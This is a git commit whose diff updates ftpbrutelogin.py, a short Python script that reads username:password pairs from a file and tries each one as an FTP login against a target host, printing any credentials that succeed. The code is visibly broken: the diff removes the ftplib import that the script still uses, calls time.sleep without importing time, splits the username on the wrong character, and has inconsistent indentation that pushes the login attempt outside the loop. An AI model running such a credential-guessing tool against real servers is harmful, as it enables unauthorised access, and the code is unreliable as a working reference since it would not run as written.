786871eb55bc3c4fce2bcd7138d117b4527a6b7c
atphinn <atphinn@gmail.com>
2019-07-17 08:41:19 -0400

    Updated FTP Brute Login

--- ftpbrutelogin.py
+++ ftpbrutelogin.py
@@ -1,14 +1,24 @@
 # brutrLogin
 
-import ftplib
-
 def bruteLogin(hostname, passwdFile):
     pF = open(passwdFile, 'r')
     for line in pF.readlines():
+        time.sleep(1)
         userName = line.split('.')[0]
         passWord = line.split(':')[1].strip('\r').strip('\n')
     print('[+] Trying:' + userName +"/" + passWord)
 
+    try:
+            ftp = ftplib.FTP(hostname)
+            ftp.login(userName, passWord)
+            print('\n[*]' + str(hostname) +\
+                "FTP login Succeeded: " + userName+ '/' + passWord)
+            
+            ftp.quit()
 
-    
-    
+            return(userName, passWord)
+        except Exception as e:
+            pass
+
+        print('\n[-]Could not brute force FTP credentials')
+        return(None, None)
